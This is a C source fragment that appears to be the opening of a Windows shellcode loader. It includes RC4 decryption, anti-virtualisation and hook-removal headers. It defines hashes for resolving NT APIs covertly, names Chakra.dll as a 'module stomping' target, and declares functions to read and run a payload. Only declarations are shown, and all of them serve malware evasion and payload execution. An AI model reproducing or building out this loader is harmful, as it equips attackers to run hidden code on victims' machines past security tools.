#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>
#include "RC4.h"
#include "AntiVirtual.h"
#include "UnHook.h"

#define CHARKRAHASH							0x193C6FA4
#define SLEEPHASH							0xA52D141F
#define READFILEHASH						0x4C03FB82
#define CREATEFILEWHASH						0x948352A4
#define GETFILESIZEHASH						0x30D2076D
#define GETMODULEHANDLEWHASH				0x1913DEE8
#define CREATEFILEMAPPINGWHASH				0x594450E0
#define MAPVIEWOFFILEWHASH					0x8B05472E
#define UNMAPVIEWOFFILEWHASH				0xAB8822C1
#define CLOSEHANDLEHASH						0xC444B3C8
#define LDRLOADDLLHASH						0xF8C1C763
#define NTCREATETHREADEXHASH				0xE824A1A3
#define NTRESUMETHREADHASH					0x894481CB
#define NTGETCONTEXTTHREADHASH				0x8E4617C2
#define NTSETCONTEXTTHREADHASH				0x5033F2F1
#define NTPROTECTVIRTUALMEMORYHASH			0xEC3562A5
#define NTWAITFORSINGLEOBJECTHASH			0x1FA40E1E
#define TPRELEASECLEANUPGROUPMEMBERSHASH	0xDC887218
#define TARGETDLL							L"C:\\Windows\\System32\\Chakra.dll"  // Maybe Replace Me :)



BOOL InitApi();
BOOL ModuleStomping(PBYTE* pbStompAddr);
BOOL ReadPayLoad(PBYTE* pbShellcode, PDWORD pdwShellcodeSize);
void RunPayload(PBYTE pbStompAddr, PBYTE pbShellcode, DWORD dwShellcodeSize);
